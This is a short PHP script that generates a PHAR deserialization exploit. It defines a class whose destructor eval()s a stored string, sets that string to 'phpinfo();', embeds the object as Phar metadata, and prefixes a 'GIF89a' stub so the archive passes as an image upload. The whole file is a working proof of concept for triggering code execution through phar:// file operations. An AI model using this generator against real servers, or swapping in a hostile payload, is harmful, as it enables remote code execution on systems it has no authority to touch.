<?php

// require_once('evil.php');

class AnyClass{
    var $output = 'echo "cck";';
    function __destruct()
    {
        eval($this -> output);
    }
}

@unlink('test.phar');
$data = new AnyClass();
$data->output='phpinfo();';

$phar = new Phar('test.phar');

$phar->startBuffering();

$phar->addFromString('test.txt','test');
$phar->setStub('GIF89a'.'<?php__HALT_COMPILER(); ?>');
$phar->setMetadata($data);


$phar->stopBuffering();
?>